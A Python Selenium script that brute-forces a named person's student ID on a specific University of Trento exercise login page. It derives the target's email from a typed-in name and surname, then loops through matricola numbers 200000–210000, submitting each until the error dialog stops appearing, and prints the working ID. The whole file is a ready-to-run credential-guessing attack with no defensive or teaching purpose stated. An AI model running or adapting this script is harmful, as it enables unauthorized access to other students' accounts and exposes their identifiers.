from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import re

print('Name: ')
name = input()
print('Surname: ')
surname = input()

# access statistica page
url = 'http://datascience.maths.unitn.it/ocpu/library/doexercises/www/'
driver = webdriver.Chrome("chromedriver.exe")
driver.get(url)

# wait for the page to be loaded
wait = WebDriverWait(driver, 20)

wait.until(EC.visibility_of_element_located((By.ID, "email_address")))

# get email and matricola values from the page
print('Login: ' + name + ' ' + surname)
email = name.lower()+'.'+surname.lower()
email = email.replace(" ","")
print('Mail:'+email)
matricola = 202352

for matricola in range(200000,210000):
  driver.find_element_by_id('email_address').clear()
  driver.find_element_by_id('matricola').clear()

  # write values in the page
  driver.find_element_by_id('email_address').send_keys(email)
  driver.find_element_by_id('matricola').send_keys(matricola)
  driver.find_element_by_id('signin').click()
  try:
    wait.until(EC.visibility_of_element_located((By.XPATH, '//*[@id="container"]/div[2]/div[1]/button')))
  except:
    print('Found, matricola: '+str(matricola))
    break
  try:
    driver.find_element_by_xpath('//*[@id="container"]/div[2]/div[1]/button').click()
  except:
    print('box of wrong credentials not found')

driver.close()